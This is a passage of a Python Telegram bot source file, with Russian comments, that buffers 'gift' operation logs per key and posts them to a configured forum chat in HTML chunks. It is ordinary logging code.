        print(f"❌ {error_msg}")
        result['error'] = error_msg
        return result

from config_bot import BotConfig as BotCfg

async def send_gift_log_message(text: str, topic_id: int = None):
    """Отправка лог-сообщения в Telegram c разбиением на части до 4000 символов.
    Также записывает в файл логов.

    Args:
        text: Текст сообщения
        topic_id: ID темы в форумной группе (опционально)
    """
    try:
        # Записываем в файл логов (убираем HTML теги для чистого текста)
        import re
        clean_text = re.sub(r'<[^>]+>', '', text)  # Убираем HTML теги
        logger.info(f"[GIFT_LOG] {clean_text}")

        from aiogram import Bot
        import os

        forum_chat_id = os.getenv("FORUM_CHAT_ID") or os.getenv("PROFIT_CHAT_ID")
        if not forum_chat_id:
            return

        logs_bot_token = os.getenv("LOGS_BOT_TOKEN") or os.getenv("TELEGRAM_LOGS_BOT_TOKEN")
        if not logs_bot_token:
            from config_bot import config
            logs_bot_token = config.BOT_TOKEN

        resolved_topic_id = topic_id
        if resolved_topic_id is None:
            topic_env = os.getenv("LOGS_TOPIC_ID") or os.getenv("LOGS_FORUM_TOPIC_ID") or os.getenv("FORUM_TOPIC_ID") or os.getenv("FORUM_CHAT_TOPIC_ID")
            if topic_env and str(topic_env).isdigit():
                resolved_topic_id = int(topic_env)

        MAX_LEN = 4000  # Telegram HTML limit

        def split_chunks(s: str, max_len: int) -> list:
            chunks = []
            start = 0
            n = len(s)
            while start < n:
                end = min(start + max_len, n)
                if end < n:
                    slice_ = s[start:end]
                    nl = slice_.rfind("\n")
                    if nl != -1 and (start + nl) > start:
                        end = start + nl + 1
                chunks.append(s[start:end])
                start = end
            return chunks

        bot = Bot(token=logs_bot_token)
        try:
            chunks = split_chunks(text, MAX_LEN)
            for chunk in chunks:
                kwargs = dict(
                    chat_id=int(forum_chat_id),
                    text=chunk,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
                if resolved_topic_id:
                    kwargs["message_thread_id"] = resolved_topic_id
                await bot.send_message(**kwargs)
        finally:
            await bot.session.close()
    except Exception as e:
        logger.error(f"⚠️ Ошибка отправки лог-сообщения в Telegram: {e}")

# ------------------------
# Агрегатор логов для спойлер-сообщений
# ------------------------
_LOG_BUFFERS: dict[str, list] = {}

def begin_gift_log(key: str):
    """Начать агрегированный лог по ключу (например, phone/user_id)."""
    try:
        if key not in _LOG_BUFFERS:
            _LOG_BUFFERS[key] = []
    except Exception:
        pass

def append_gift_log(key: str, line: str):
    """Добавить строку в агрегированный лог."""
    try:
        buf = _LOG_BUFFERS.get(key)
        if buf is None:
            buf = []
            _LOG_BUFFERS[key] = buf
        buf.append(line)
        # Также записываем в файл логов
        logger.info(f"[{key}] {line}")
    except Exception:
        pass

async def flush_gift_log(key: str, header: str = "Логи операции", with_spoiler: bool = True):
    """Отправить агрегированный лог с разбиением на сообщения по 1500 символов и очистить буфер.
    Также записывает полный лог в файл.

    Примечание: если with_spoiler=True, текст оборачивается в HTML-блок цитаты (<blockquote>),
    чтобы он был не скрытым, а оформленным как раскрывающаяся цитата.
    """
    try:
        lines = _LOG_BUFFERS.get(key, [])
        if not lines:
            return
        
        # Записываем полный лог в файл перед отправкой в Telegram
        try:
            full_log = f"{header}\n" + "\n".join(lines)
            logger.info(f"[FLUSH_GIFT_LOG] [{key}]\n{full_log}")
        except Exception as log_err:
            logger.warning(f"Ошибка записи лога в файл: {log_err}")
        
        MAX_LEN = 1500
        # Используем цитату вместо спойлера
        blockquote_open = "<blockquote>" if with_spoiler else ""
        blockquote_close = "</blockquote>" if with_spoiler else ""
        header_text = f"🧾 <b>{header}</b>\n"
        body = "\n".join(lines)

        def split_chunks(text: str, max_len: int) -> list:
            chunks = []
            start = 0
            n = len(text)
            while start < n:
                end = min(start + max_len, n)
                if end < n:
                    slice_ = text[start:end]
                    nl = slice_.rfind("\n")
                    if nl != -1 and (start + nl) > start:
                        end = start + nl + 1
                chunks.append(text[start:end])
                start = end
            return chunks

        # Первая часть включает заголовок и цитату
        first_limit = MAX_LEN - len(header_text) - len(blockquote_open) - len(blockquote_close)
        if first_limit <= 0:
            first_limit = MAX_LEN
        body_chunks = split_chunks(body, first_limit)

        if body_chunks:
            first_msg = f"{header_text}{blockquote_open}{body_chunks[0]}{blockquote_close}"
            await send_gift_log_message(first_msg)

            # Остальные части без повторного заголовка, но в цитате
            subsequent_limit = MAX_LEN - len(blockquote_open) - len(blockquote_close)
            if subsequent_limit <= 0:
                subsequent_limit = MAX_LEN
            for chunk in body_chunks[1:]:
                for sub in split_chunks(chunk, subsequent_limit):
                    await send_gift_log_message(f"{blockquote_open}{sub}{blockquote_close}")
    except Exception as e:
        logger.error(f"⚠️ Ошибка отправки агрегированного лога: {e}")
    finally:
        try:
            _LOG_BUFFERS.pop(key, None)
        except Exception:
            pass